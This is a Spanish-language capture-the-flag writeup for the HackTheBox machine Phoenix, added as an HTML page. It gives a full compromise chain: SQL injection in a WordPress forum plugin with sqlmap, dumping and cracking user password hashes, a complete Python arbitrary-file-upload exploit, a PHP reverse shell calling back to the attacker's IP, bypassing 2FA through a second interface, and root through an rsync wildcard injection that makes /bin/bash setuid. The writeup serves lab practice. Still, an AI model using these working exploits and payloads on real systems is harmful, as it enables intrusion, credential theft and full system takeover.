@@ -1,0 +1,377 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Phoenix HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/phoenix.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Phoenix HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Phoenix de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Phoenix de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Phoenix HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Phoenix HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Phoenix de la plataforma de HackTheBox","headline":"Writeup Phoenix HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Phoenix HackTheBox</h1>
+          <p>Resolución de la máquina Phoenix de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 10.10.11.149
+Nmap scan report for 10.10.11.149
+PORT      STATE SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+443/tcp  open     https</span>
+</code></pre></div></div>
+
+<div><p>Si enviamos un curl a 10.10.11.149 nos redirige a https://phoenix.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> 10.10.11.149
+301 Moved Permanently
+The document has moved &lta href="https://phoenix.htb/">here&lt/a></span>
+</code></pre></div></div>
+
+<div><p>Despues de agregar el host, miramos con whatweb las tecnologías y encontramos un wordpress</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ whatweb</span><span class="p"> https://phoenix.htb
+Bootstrap[1.0.0,5.9]
+JQuery[3.6.0]
+WordPress[</span><span class="kd">5.9</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Tiramos wpscan y lo más interesante es lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ wpscan</span><span class="p"> --url https://phoenix.htb/ --disable-tls-checks –enumerate
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+_______________________________________________________________
+
+[</span><span class="s2">+</span><span class="p">] URL: https://phoenix.htb/ [10.10.11.149]
+[</span><span class="s2">+</span><span class="p">] robots.txt found: https://phoenix.htb/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[</span><span class="na">i</span><span class="p">] Plugin(s) Identified:
+
+[</span><span class="s2">+</span><span class="p">] asgaros-forum
+ | Location: https://phoenix.htb/wp-content/plugins/asgaros-forum/
+ | Last Updated: 2022-01-30T12:54:00.000Z
+ | [</span><span class="kd">!</span><span class="p">] The version is out of date, the latest version is 2.0.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: </span><span class="kd">1.15.12</span><span class="p"> (10% confidence)
+ | Found By: Query Parameter (Passive Detection)
+ |  - https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12
+
+[</span><span class="s2">+</span><span class="p">] Finished</span>
+</code></pre></div></div>
+
+<div><p>Tiene la versión 1.5.12 y encontramos el siguiente <a href="https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1">exploit</a> para las anteriores a la 1.5.13, vemos una posible inyección sql con el ejemplo: "https://example.com/forum/?subscribe_topic=1"</p></div>
+<div><p>Entonces jugaremos con sqlmap dandole la direccion, encontramos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ sqlmap</span><span class="p"> --url "https://phoenix.htb/forum/?subscribe_topic=1"
+&lt.....................................&gt
+Database: wordpress
+[40 tables]
++-------------------------------------+
+| wp_commentmeta                      |
+| wp_comments                         |
+| wp_forum_ads                        |
+| wp_forum_forums                     |
+| wp_forum_polls                      |
+| wp_forum_polls_options              |
+| wp_forum_polls_votes                |
+| wp_forum_posts                      |
+| wp_forum_reactions                  |
+| wp_forum_reports                    |
+| wp_forum_topics                     |
+| wp_links                            |
+| wp_mo2f_network_blocked_ips         |
+| wp_mo2f_network_email_sent_audit    |
+| wp_mo2f_network_transactions        |
+| wp_mo2f_network_whitelisted_ips     |
+| wp_mo2f_user_details                |
+| wp_mo2f_user_login_info             |
+| wp_options                          |
+| wp_pieregister_code                 |
+| wp_pieregister_custom_user_roles    |
+| wp_pieregister_invite_code_emails   |
+| wp_pieregister_lockdowns            |
+| wp_pieregister_redirect_settings    |
+| wp_postmeta                         |
+| wp_posts                            |
+| wp_term_relationships               |
+| wp_term_taxonomy                    |
+| wp_termmeta                         |
+| wp_terms                            |
+| wp_usermeta                         |
+| wp_users                            |
+| wp_wpns_attack_logs                 |
+| wp_wpns_backup_report               |
+| wp_wpns_files_scan                  |
+| wp_wpns_ip_rate_details             |
+| wp_wpns_malware_hash_file           |
+| wp_wpns_malware_scan_report         |
+| wp_wpns_malware_scan_report_details |
+| wp_wpns_malware_skip_files          |
++-------------------------------------+
+&lt.....................................&gt</span>
+</code></pre></div></div>
+
+<div><p>Dumpeamos wp_users y entre más cosas encontramos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">+----+------------+------------------------------------+------------------------+
+| ID | user_login | user_pass                          | user_email             |
++----+------------+------------------------------------+------------------------+
+|  1 | Phoenix    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. | phoenix@phoenix.htb    |
+|  3 | john       | $P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz. | john@domain.htb        |
+|  5 | Jsmith     | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. | john.smith@phoenix.htb |
+|  6 | Jane       | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 | jane@phoenix.htb       |
+|  7 | Jack       | $P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e. | jack@phoenix.htb       |
++----+------------+------------------------------------+------------------------+</span>
+</code></pre></div></div>
+
+<div><p>Intentamos romper los hashes con john y encontramos 3 contraseñas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hashes
+phoenix:$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.
+john:$P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz.
+jsmith:$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.
+jane:$P$BJCq26vxPmaQtAthFcnyNv1322qxD91
+jack:$P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e.
+</span><span class="s2">❯ john</span><span class="p"> --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
+Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 XOP 4x2])
+</span><span class="kd">password@1234</span><span class="p">    (</span><span class="kd">john</span><span class="p">)
+</span><span class="kd">phoenixthefirebird14</span><span class="p"> (</span><span class="kd">phoenix</span><span class="p">)
+</span><span class="kd">superphoenix</span><span class="p">     (</span><span class="kd">jsmith</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Probamos las credenciales en el login, las de phoenix funcionan pero...</p></div>
+<div><p><img src="./../phoenix/1.png"><p></div>
+
+<div><p>Como por ssh no funcionan probamos cosas diferentes, encontramos el siguiente <a href="https://www.exploit-db.com/exploits/50287">exploit</a></p></div>
+<div><p>Para omitir el ssl en estas dos lineas agregaremos ",verify=False"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">response </span><span class="kd">=</span><span class="p"> requests.get(uri)
+response </span><span class="kd">=</span><span class="p"> requests.get(uri, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)
+response </span><span class="kd">=</span><span class="p"> requests.post(uri, </span><span class="no">files</span><span class="kd">=</span><span class="p">files, </span><span class="no">data</span><span class="kd">=</span><span class="p">data)
+response </span><span class="kd">=</span><span class="p"> requests.post(uri, </span><span class="no">files</span><span class="kd">=</span><span class="p">files, </span><span class="no">data</span><span class="kd">=</span><span class="p">data, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)</span>
+</code></pre></div></div>
+
+<div><p>Al final quedaria así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import</span><span class="p"> os.path
+</span><span class="kd">from</span><span class="p"> os </span><span class="kd">import</span><span class="p"> path
+</span><span class="kd">import</span><span class="p"> json
+</span><span class="kd">import</span><span class="p"> requests
+</span><span class="kd">import</span><span class="p"> sys
+
+</span><span class="k">def print_banner</span><span class="p">():
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"Download From Files <= 1.48 - Arbitrary File Upload"</span><span class="p">)
+
+</span><span class="k">def print_usage</span><span class="p">():
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"Usage: python3 exploit.py [target url] [php file]"</span><span class="p">)
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)"</span><span class="p">)
+
+</span><span class="k">def vuln_check</span><span class="p">(</span><span class="no">uri</span><span class="p">):
+    response </span><span class="kd">=</span><span class="p"> requests.get(uri, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)
+    raw </span><span class="kd">=</span><span class="p"> response.text
+
+    </span><span class="kd">if</span><span class="p"> (</span><span class="s2">"Sikeres"</span><span class="kd"> in </span><span class="p">raw):
+        </span><span class="kd">return</span><span class="p"> True
+    </span><span class="kd">else</span><span class="p">:
+        </span><span class="kd">return </span><span class="p">False
+
+</span><span class="k">def main</span><span class="p">():
+
+    print_banner()
+    </span><span class="kd">if</span><span class="p">(</span><span class="k">len</span><span class="p">(sys.argv) </span><span class="kd">!=</span><span class="na"> 3</span><span class="p">):
+        print_usage()
+        sys.exit(</span><span class="na">1</span><span class="p">)
+
+    base </span><span class="kd">=</span><span class="p"> sys.argv[</span><span class="na">1</span><span class="p">]
+    file_path </span><span class="kd">=</span><span class="p"> sys.argv[</span><span class="na">2</span><span class="p">]
+
+    ajax_action </span><span class="kd">=</span><span class="s2"> 'download_from_files_617_fileupload'</span><span class="p">
+    admin </span><span class="kd">=</span><span class="s2"> '/wp-admin/admin-ajax.php'</span><span class="p">
+
+    uri </span><span class="kd">=</span><span class="p"> base</span><span class="kd"> + </span><span class="p">admin</span><span class="kd"> +</span><span class="s2"> '?action='</span><span class="kd"> +</span><span class="p"> ajax_action
+    check </span><span class="kd">=</span><span class="p"> vuln_check(uri)
+
+    </span><span class="kd">if</span><span class="p">(check </span><span class="kd">==</span><span class="p"> False):
+        </span><span class="k">print</span><span class="p">(</span><span class="s2">"(*) Target not vulnerable!"</span><span class="p">)
+        sys.exit(</span><span class="na">1</span><span class="p">)
+
+    </span><span class="kd">if</span><span class="p">(path.isfile(file_path) </span><span class="kd">==</span><span class="p"> False):
+        </span><span class="k">print</span><span class="p">(</span><span class="s2">"(*) Invalid file!"</span><span class="p">)
+        sys.exit(</span><span class="na">1</span><span class="p">)
+
+    files </span><span class="kd">=</span><span class="p"> {</span><span class="s2">'files[]' </span><span class="p">:</span><span class="k"> open</span><span class="p">(file_path)}
+    data </span><span class="kd">=</span><span class="p"> {
+    </span><span class="s2">"allowExt" </span><span class="p">:</span><span class="s2"> "php4,phtml"</span><span class="p">,
+    </span><span class="s2">"filesName" </span><span class="p">:</span><span class="s2"> "files"</span><span class="p">,
+    </span><span class="s2">"maxSize" </span><span class="p">:</span><span class="s2"> "1000"</span><span class="p">,
+    </span><span class="s2">"uploadDir" </span><span class="p">:</span><span class="s2"> "."</span><span class="p">
+    }
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"Uploading Shell..."</span><span class="p">)
+    response </span><span class="kd">=</span><span class="p"> requests.post(uri, </span><span class="no">files</span><span class="kd">=</span><span class="p">files, </span><span class="no">data</span><span class="kd">=</span><span class="p">data, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)
+    file_name </span><span class="kd">=</span><span class="p"> path.basename(file_path)
+    </span><span class="kd">if</span><span class="p">(</span><span class="s2">"ok"</span><span class="kd"> in</span><span class="p"> response.text):
+        </span><span class="k">print</span><span class="p">(</span><span class="s2">"Shell Uploaded!"</span><span class="p">)
+        </span><span class="kd">if</span><span class="p">(base[</span><span class="kd">-</span><span class="na">1</span><span class="p">] </span><span class="kd">!= </span><span class="s2">'/'</span><span class="p">):
+            base </span><span class="kd">+= </span><span class="s2">'/'</span><span class="k">
+        print</span><span class="p">(base</span><span class="kd"> + </span><span class="s2">"wp-admin/"</span><span class="kd"> + </span><span class="p">file_name)
+    </span><span class="kd">else</span><span class="p">:
+        </span><span class="k">print</span><span class="p">(</span><span class="s2">"Shell Upload Failed"</span><span class="p">)
+        sys.exit(</span><span class="na">1</span><span class="p">)
+
+main()</span>
+</code></pre></div></div>
+
+<div><p>Nos pide un archivo php con una reverse shell usaremos el <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">siguiente</a> de monkey pentester, cambianos nuestra ip y puerto además de la extensión a phtml</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">$ip</span><span class="p"> =</span><span class="s2"> '127.0.0.1'</span><span class="p">;
+</span><span class="k">$port</span><span class="p"> = </span><span class="s2">1234</span><span class="p">;</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">$ip</span><span class="p"> =</span><span class="kd"> '10.10.14.10'</span><span class="p">;
+</span><span class="k">$port</span><span class="p"> = </span><span class="kd">443</span><span class="p">;</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mv</span><span class="p"> php-reverse-shell.php rev.phtml</span>
+</code></pre></div></div>
+
+<div><p>Ejecutamos el exploit de la siguiente manera y nos da una ruta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py https://phoenix.htb/ rev.phtml
+Download From Files <= 1.48 - Arbitrary File Upload
+Uploading Shell...
+Shell Uploaded!
+https://phoenix.htb/wp-admin/rev.phtml</span>
+</code></pre></div></div>
+<div><p>Estando en escucha, hacemos un curl a la ruta con -k por el certificado ssl y recibimos la shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -k https://phoenix.htb/wp-admin/rev.phtml</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.149
+</span><span class="s2">wp_user@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Miramos los usuarios e intentando reutilizar las contraseñas que encontramos antes conectarnos por ssh encontramos que las credenciales editor:superphoenix son validas pero nos pide un codigo de verificación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wp_user@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+phoenix:x:1000:1000:Phoenix:/home/phoenix:/bin/bash
+editor:x:1002:1002:John Smith,1,1,1,1:/home/editor:/bin/bash</span>
+<span class="s2">wp_user@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ ssh editor@localhost
+$$$$$$$\  $$\                                     $$\           
+$$  __$$\ $$ |                                    \__|          
+$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
+$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
+$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
+$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
+$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
+\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
+Password: </span><span class="kd">superphoenix</span><span class="p">
+Verification code:</span>
+</code></pre></div></div>
+
+<div><p>Despues de mucho tiempo buscando encontramos que la solución es sencilla, hay otra interfaz abierta "10.11.12.13" donde no nos pide 2fa, ahora tenemos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wp_user@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ ifconfig | grep "inet\ "
+        inet 10.10.11.149  netmask 255.255.254.0  broadcast 10.10.11.255
+        inet </span><span class="kd">10.11.12.13</span><span class="p">  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="s2">wp_user@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ ssh editor@10.11.12.13
+$$$$$$$\  $$\                                     $$\
+$$  __$$\ $$ |                                    \__|
+$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\
+$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
+$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  /
+$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<
+$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\
+\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
+Password: </span><span class="kd">superphoenix</span>
+<span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+001***********************293
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usamos pspy para mirar procesos pero no podemos ver procesos de otros usuarios aunque encontramos el siguiente binario /usr/local/bin/cron.sh.x, esto no es común verlo</p></div>
+<div><p>Si lo ejecutamos manualmente entre más cosas encontramos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">~</span><span class="p">$ /usr/local/bin/cron.sh.x
+</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=1002  | rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/</span></code></pre></div></div>
+
+<div><p>Solo nos queda suponer que root lo ejecuta ya que se llama "cron" en <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks">hacktricks</a> podemos ver una manera de explotar rsync</p></div>
+<div><p>Es crear un archivo con el nombre "-e sh shell.sh" para que nos ejecute un archivo "shell.sh" que nosotros podemos definir entonces lo explotaremos así en /backups</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ touch -- "-e sh shell.sh"
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ chmod +x -- "-e sh shell.sh"
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ echo "chmod u+s /bin/bash" > shell.sh
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ chmod +x shell.sh
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Después de aproximadamente 3 minutos ¡root lo ejecuta! entonces ejecutamos la bash como el propietario y somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+</span><span class="s2">editor@phoenix</span><span class="p">:</span><span class="na">/backups</span><span class="p">$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+667*************************390
+bash-5.0#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
